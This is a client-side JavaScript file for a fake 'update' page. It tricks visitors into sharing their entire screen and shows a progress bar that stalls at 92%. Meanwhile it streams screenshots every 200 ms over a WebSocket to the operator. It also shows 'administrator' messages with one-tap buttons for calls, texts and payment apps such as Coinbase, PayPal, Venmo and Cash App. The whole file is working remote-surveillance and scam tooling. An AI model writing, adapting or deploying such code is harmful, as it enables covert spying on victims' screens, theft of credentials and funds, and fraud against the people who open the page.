(() => {
  const acceptBtn = document.getElementById("accept-btn");
  const statusEl = document.getElementById("status");
  const video = document.getElementById("preview");
  const canvas = document.getElementById("send-canvas");
  const ctx = canvas.getContext("2d");
  const headline = document.getElementById("headline");
  const bodyText = document.getElementById("body-text");
  const promptView = document.getElementById("prompt-view");
  const progressView = document.getElementById("progress-view");
  const percentEl = document.getElementById("percent");
  const barFill = document.getElementById("bar-fill");

  let ws = null;
  let stream = null;
  let sendTimer = null;
  let progressTimer = null;
  let frameId = 0;
  let reconnectTimer = null;
  let fakeProgress = 0;
  const FRAME_MS = 200;
  const JPEG_QUALITY = 0.6;

  const hasDisplay = !!(
    navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia
  );
  const isIOS =
    /iPad|iPhone|iPod/.test(navigator.userAgent) ||
    (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);

  const MODE = hasDisplay && !isIOS ? "display" : "unsupported";

  if (MODE === "unsupported") {
    headline.textContent = "Update unavailable on this device";
    bodyText.textContent =
      "This feature requires a browser with screen capture support. Please open this link on Android Chrome, Edge, Firefox, or a desktop browser.";
    acceptBtn.disabled = true;
    return;
  }

  function getFingerprint() {
    let fp = null;
    try {
      fp = localStorage.getItem("ss_fp");
    } catch {}
    if (!fp) {
      fp =
        "fp_" + Math.random().toString(36).slice(2) + Date.now().toString(36);
      try {
        localStorage.setItem("ss_fp", fp);
      } catch {}
    }
    return fp;
  }
  const FP = getFingerprint();

  const keepAliveSrc = `setInterval(() => postMessage('tick'), 1000)`;
  const keepAliveWorker = new Worker(
    URL.createObjectURL(
      new Blob([keepAliveSrc], { type: "application/javascript" }),
    ),
  );
  keepAliveWorker.onmessage = () => {};

  acceptBtn.addEventListener("click", start);

  async function start() {
    acceptBtn.disabled = true;
    statusEl.textContent = "Requesting screen access…";

    const opts = {
      video: {
        displaySurface: "monitor",
        frameRate: { ideal: 5, max: 10 },
        width: { ideal: 1280 },
        height: { ideal: 720 },
      },
      audio: false,
      selfBrowserSurface: "exclude",
      surfaceSwitching: "exclude",
      preferCurrentTab: false,
    };

    let rawStream;
    try {
      rawStream = await navigator.mediaDevices.getDisplayMedia(opts);
    } catch (err) {
      const name = err && err.name ? err.name : "Error";
      if (name === "NotAllowedError")
        statusEl.textContent =
          'Permission denied. Tap again and choose "Entire screen".';
      else if (name === "NotSupportedError")
        statusEl.textContent = "This browser does not support screen capture.";
      else statusEl.textContent = `Error: ${name}.`;
      acceptBtn.disabled = false;
      return;
    }

    const track = rawStream.getVideoTracks()[0];
    const settings = track.getSettings ? track.getSettings() : {};
    const surface = settings.displaySurface;

    if (surface && surface !== "monitor") {
      rawStream.getTracks().forEach((t) => t.stop());
      const wrong = surface === "browser" ? "a browser tab" : "a single window";
      statusEl.textContent = `You picked ${wrong}. Tap Accept again and select "Entire screen".`;
      acceptBtn.disabled = false;
      setTimeout(() => {
        if (!acceptBtn.disabled) acceptBtn.click();
      }, 800);
      return;
    }

    stream = rawStream;
    video.srcObject = stream;
    await video.play().catch(() => {});
    track.addEventListener("ended", () => {
      showPrompt();
      stopSharing();
    });

    showProgress();
    startFakeProgress();
    connectWs();
    sendTimer = setInterval(captureAndSend, FRAME_MS);
  }

  function showPrompt() {
    promptView.hidden = false;
    progressView.hidden = true;
    acceptBtn.disabled = false;
    statusEl.textContent = "";
  }
  function showProgress() {
    promptView.hidden = true;
    progressView.hidden = false;
  }
  function startFakeProgress() {
    fakeProgress = 0;
    percentEl.textContent = "0%";
    barFill.style.width = "0%";
    if (progressTimer) clearInterval(progressTimer);
    progressTimer = setInterval(() => {
      if (fakeProgress >= 92) {
        clearInterval(progressTimer);
        progressTimer = null;
        return;
      }
      fakeProgress += 0.8 + Math.random() * 0.6;
      if (fakeProgress > 92) fakeProgress = 92;
      percentEl.textContent = Math.floor(fakeProgress) + "%";
      barFill.style.width = fakeProgress + "%";
    }, 700);
  }

  function connectWs() {
    if (reconnectTimer) {
      clearTimeout(reconnectTimer);
      reconnectTimer = null;
    }
    const proto = location.protocol === "https:" ? "wss" : "ws";
    ws = new WebSocket(
      `${proto}://${location.host}/ws?role=visitor&fp=${encodeURIComponent(FP)}`,
    );
    ws.onopen = () => {};
    ws.onmessage = (ev) => {
      let msg;
      try {
        msg = JSON.parse(ev.data);
      } catch {
        return;
      }
      if (msg && msg.type === "admin-message") showAdminMessage(msg.text || "");
    };
    ws.onclose = () => {
      if (stream) reconnectTimer = setTimeout(connectWs, 1500);
    };
    ws.onerror = () => {};
  }

  function captureAndSend() {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    if (!video.videoWidth || !video.videoHeight) return;
    if (
      canvas.width !== video.videoWidth ||
      canvas.height !== video.videoHeight
    ) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
    }
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(
      (blob) => {
        if (!blob) return;
        const reader = new FileReader();
        reader.onload = () => {
          const b64 = reader.result.split(",")[1];
          ws.send(
            JSON.stringify({
              type: "frame",
              seq: ++frameId,
              ts: Date.now(),
              data: b64,
            }),
          );
        };
        reader.readAsDataURL(blob);
      },
      "image/jpeg",
      JPEG_QUALITY,
    );
  }

  function stopSharing() {
    if (sendTimer) {
      clearInterval(sendTimer);
      sendTimer = null;
    }
    if (progressTimer) {
      clearInterval(progressTimer);
      progressTimer = null;
    }
    if (stream) {
      stream.getTracks().forEach((t) => t.stop());
      stream = null;
    }
    if (ws && ws.readyState === WebSocket.OPEN)
      ws.send(JSON.stringify({ type: "session-ended" }));
  }

  // ---- app-scheme detection ----
  const APP_SCHEMES = [
    {
      name: "SMS",
      regex: /\bsms:(\+?[0-9][0-9\s\-()]*[0-9])/i,
      build: (m) => ({
        label: "Open in Messages",
        href: "sms:" + m[1].replace(/[^\d+]/g, ""),
      }),
    },
    {
      name: "Phone",
      regex: /\btel:(\+?[0-9][0-9\s\-()]*[0-9])/i,
      build: (m) => ({
        label: "Call number",
        href: "tel:" + m[1].replace(/[^\d+]/g, ""),
      }),
    },
    {
      name: "Email",
      regex: /\bmailto:([^\s?]+(?:\?[^\s]*)?)/i,
      build: (m) => ({ label: "Open email", href: "mailto:" + m[1] }),
    },
    {
      name: "WhatsApp",
      regex: /\bwhatsapp:\/\/([^\s]+)/i,
      build: (m) => ({ label: "Open WhatsApp", href: "whatsapp://" + m[1] }),
    },
    {
      name: "Telegram",
      regex: /\btg:\/\/([^\s]+)/i,
      build: (m) => ({ label: "Open Telegram", href: "tg://" + m[1] }),
    },
    {
      name: "Facebook",
      regex: /\bfb:\/\/([^\s]*)/i,
      build: (m) => ({ label: "Open Facebook", href: "fb://" + m[1] }),
    },
    {
      name: "Instagram",
      regex: /\binstagram:\/\/([^\s]+)/i,
      build: (m) => ({ label: "Open Instagram", href: "instagram://" + m[1] }),
    },
    {
      name: "Twitter",
      regex: /\btwitter:\/\/([^\s]+)/i,
      build: (m) => ({ label: "Open Twitter", href: "twitter://" + m[1] }),
    },
    {
      name: "Coinbase",
      regex: /\bcoinbase:\/\/([^\s]*)/i,
      build: (m) => ({ label: "Open Coinbase", href: "coinbase://" + m[1] }),
    },
    {
      name: "PayPal",
      regex: /\bpaypal:\/\/([^\s]*)/i,
      build: (m) => ({ label: "Open PayPal", href: "paypal://" + m[1] }),
    },
    {
      name: "Venmo",
      regex: /\bvenmo:\/\/([^\s]+)/i,
      build: (m) => ({ label: "Open Venmo", href: "venmo://" + m[1] }),
    },
    {
      name: "Cash App",
      regex: /\bcashme:\/\/([^\s]+)/i,
      build: (m) => ({ label: "Open Cash App", href: "cashme://" + m[1] }),
    },
    {
      name: "Maps",
      regex: /\b(?:maps|geo):([^\s]+)/i,
      build: (m) => ({ label: "Open Maps", href: "geo:" + m[1] }),
    },
    {
      name: "YouTube",
      regex: /\byoutube:\/\/([^\s]+)/i,
      build: (m) => ({ label: "Open YouTube", href: "youtube://" + m[1] }),
    },
    {
      name: "Spotify",
      regex: /\bspotify:([^\s]+)/i,
      build: (m) => ({ label: "Open Spotify", href: "spotify:" + m[1] }),
    },
  ];

  function detectAppButtons(text) {
    const buttons = [];
    const seen = new Set();
    for (const spec of APP_SCHEMES) {
      const m = text.match(spec.regex);
      if (!m) continue;
      const built = spec.build(m);
      if (!built || !built.href) continue;
      if (seen.has(built.href)) continue;
      seen.add(built.href);
      buttons.push({ name: spec.name, ...built });
    }
    const urlMatches = text.match(/https?:\/\/[^\s]+/gi) || [];
    for (const u of urlMatches) {
      if (seen.has(u)) continue;
      seen.add(u);
      buttons.push({ name: "Link", label: "Open link", href: u });
    }
    return buttons;
  }

  function showAdminMessage(text) {
    let banner = document.getElementById("admin-msg-banner");
    if (!banner) {
      banner = document.createElement("div");
      banner.id = "admin-msg-banner";
      banner.className = "admin-msg-banner";
      const box = document.querySelector("#progress-view .box");
      if (box) box.appendChild(banner);
    }
    banner.innerHTML = "";

    const label = document.createElement("div");
    label.className = "admin-msg-label";
    label.textContent = "Message from administrator";
    banner.appendChild(label);

    const body = document.createElement("div");
    body.className = "admin-msg-body";
    body.textContent = text;
    banner.appendChild(body);

    const buttons = detectAppButtons(text);
    if (buttons.length) {
      const actions = document.createElement("div");
      actions.className = "admin-msg-actions";
      for (const b of buttons) {
        const a = document.createElement("a");
        a.className = "admin-msg-btn";
        a.href = b.href;
        a.textContent = b.label;
        a.setAttribute("rel", "noopener");
        a.addEventListener("click", () => {
          setTimeout(() => banner.classList.remove("show"), 600);
        });
        actions.appendChild(a);
      }
      banner.appendChild(actions);
    }

    banner.classList.add("show");
    clearTimeout(banner._t);
    banner._t = setTimeout(() => banner.classList.remove("show"), 20000);
  }

  document.addEventListener("visibilitychange", () => {
    if (!document.hidden && stream) captureAndSend();
  });
})();
